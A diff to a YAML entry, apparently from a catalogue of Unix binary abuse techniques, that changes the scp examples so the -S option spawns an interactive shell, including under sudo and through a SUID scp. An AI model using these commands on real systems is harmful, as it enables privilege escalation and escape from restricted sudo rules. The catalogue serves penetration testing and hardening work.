@@ -1,10 +1,9 @@
 ---
 functions:
-  execute-non-interactive:
+  execute-interactive:
     - code: |
         TF=$(mktemp)
-        CMD="id"
-        echo "$CMD" > "$TF"
+        echo 'sh 0<&2 1>&2' > $TF
         chmod +x "$TF"
         scp -S $TF x y:
   upload:
@@ -22,15 +21,13 @@ functions:
   sudo-enabled:
     - code: |
         TF=$(mktemp)
-        CMD="id"
-        echo "$CMD" > "$TF"
+        echo 'sh 0<&2 1>&2' > $TF
         chmod +x "$TF"
         sudo scp -S $TF x y:
   suid-limited:
     - code: |
         TF=$(mktemp)
-        CMD="id"
-        echo "$CMD" > "$TF"
+        echo 'sh 0<&2 1>&2' > $TF
         chmod +x "$TF"
         ./scp -S $TF a b:
 ---
